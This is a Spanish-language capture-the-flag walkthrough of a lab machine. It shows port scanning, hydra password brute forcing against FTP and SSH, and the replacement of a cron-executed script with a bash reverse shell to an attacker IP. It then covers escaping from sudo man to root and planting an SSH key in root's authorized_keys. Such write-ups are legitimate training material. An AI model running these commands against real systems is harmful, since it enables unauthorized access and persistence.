```
192.168.1.162
```
# Reconocimiento
Iniciamos el laboratorio con un reconocimiento general de puertos.

```sh
nmap -p- -sT -A -T5 192.168.1.162 -oN allPorts  
  

PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.3  
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)  
| ssh-hostkey:    
|   256 5e:9f:68:a6:47:8a:7a:75:09:8e:8b:34:b1:e1:47:18 (ECDSA)  
|_  256 49:d8:aa:23:a0:a9:1f:82:fd:89:c6:6d:18:d4:03:80 (ED25519)  
80/tcp open  http    Apache httpd 2.4.59 ((Debian))  
|_http-title: Apache2 Debian Default Page: It works  
|_http-server-header: Apache/2.4.59 (Debian)
```

El FTP me llama la atención, la versión es vulnerable, pero a DoS, que no me sirve para nada, pasaré a analizar la web en busca de credenciales. 

```sh
searchsploit vsftpd 3.0.3                                    
  
vsftpd 3.0.3 - Remote Denial of Service
```

# Un poco de fuzzing

```sh
ffuf -u "http://192.168.1.162/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 100 -c -r -ac -ic
```

Al ir a la web y fuzzear un poco por el directorio root, encuentro un endpoint llamado `/web`. En él hay únicamente un mensaje:

> [!quote] Bob, comprueba que la limpieza se estÃ© ejecutando automÃ¡ticamente en el sistema

Quizá Bob es un nombre con el que poder acceder al servidor FTP.

## Fuerza bruta
Con `hydra` llevo a cabo un ataque de fuerza bruta al servidor FTP, funciona y obtengo credenciales para entrar al servidor FTP.

```sh
hydra -l bob -P /usr/share/wordlists/rockyou.txt  -t 64 -s 21 ftp://192.168.1.162 -I  
  
[21][ftp] host: 192.168.1.162   login: bob   password: chocolate
```

# Dentro de FTP
Dentro del servidor, hay dos archivos, solo tenemos permisos en `limpieza.sh`. El contenido 

```
ftp> ls  
229 Entering Extended Passive Mode (|||27195|)  
150 Here comes the directory listing.  
-rw-r--r--    1 1001     1001          352 May 16  2024 limpieza.sh  
-r--------    1 0        0              33 May 16  2024 user.txt  
226 Directory send OK.  
ftp> pwd  
Remote directory: /home/bob  
ftp> more limpieza.sh  
#!/bin/bash  
  
temp_directories=("/tmp" "/var/tmp" "/run/user/$UID")  
  
file_patterns=("*.tmp" "*.temp" "*.bak" "*.swp")  
  
echo "Eliminando archivos temporales..."  
  
for dir in "${temp_directories[@]}"; do  
   for pattern in "${file_patterns[@]}"; do  
       find "$dir" -type f -name "$pattern" -delete  
   done  
done  
  
echo "Archivos temporales eliminados."  
ftp>
```

Después de un rato trasteando con distintas cosas, llego a la conclusión de que hay un cronjob que ejecuta el script con relativa frecuencia. Pruebo distintos métodos hasta que me doy cuenta de que puedo renombrar el archivo en la máquina víctima. Le cambio el nombre a uno cualquiera y subo mi propio `limpieza.sh` con una reverse shell.

```sh
## En mi máquina

cat limpieza.sh    
#!/bin/bash  
bash -c "bash -i >& /dev/tcp/192.168.1.140/444 0>&1"


================================================================================================================================

En la máquina remota

ftp> rename limpieza.sh pu
ftp> put /home/kali/Choco/limpieza.sh
```

Al cabo de unos segundos recibo una shell

```sh
penelope -p 444

bob@chocolate:~$ id  
uid=1001(bob) gid=1001(bob) grupos=1001(bob),100(users)
```

# Escalada
Mientras voy probando cosas, dejo un ataque de fuerza bruta atacando al otro usuario del sistema (`secretote`), a los pocos minutos encuentra una contraseña válida

```sh
hydra -l secretote -P /usr/share/wordlists/rockyou.txt  -t 64 -s 22 ssh://192.168.1.162 -I  
  
[22][ssh] host: 192.168.1.162   login: secretote   password: chocolate1
```

Entonces, cambio a ese usuario en la máquina víctima, al lanzar `sudo -l` veo que puedo ejecutar el binario `man` con privilegios de root, lo que habilita una escalada relativamente sencilla.

```sh
bob@chocolate:~$ su secretote  
Contraseña:    
secretote@chocolate:/home/bob$ sudo -l  
Matching Defaults entries for secretote on chocolate:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User secretote may run the following commands on chocolate:  
   (ALL : ALL) /usr/bin/man  
   
secretote@chocolate:/home/bob$ sudo -u root man man  ## Dentro del manual --> !/bin/bash + ENTER
root@chocolate:/home/bob# id  
uid=0(root) gid=0(root) grupos=0(root)
```

Sin embargo, hay un nuevo problema, no se puede leer la flag user.

```sh
root@chocolate:/home/bob# ls  
ls: no se puede abrir el directorio '.': Permiso denegado  
root@chocolate:/home/bob# cat /root/root.txt    
**************  
root@chocolate:/home/bob# cat user.txt  
cat: user.txt: Permiso denegado  
root@chocolate:/home/bob#
```

Sospecho que puede ser por algún tipo de conflicto, ya que al fin y al cabo estamos dentro de `man`. Creo una pareja de llaves RSA en la máquina atacante y copio la llave pública en el archivo de llaves autorizadas de root.

```sh
## En la máquina atacante
ssh-keygen -t rsa -f user_key
cat user_key.pub ## Para copiar el contenido

```

```sh
## En la máquina víctima
root@chocolate:~# echo "[EL CONTENIDO DE user_key.pub]"> /root/.ssh/authorized_keys
```

```sh
## De nuevo en la máquina atacante

ssh -i /home/user_key root@192.168.1.162
```

Ahora ya se puede leer la flag sin problema.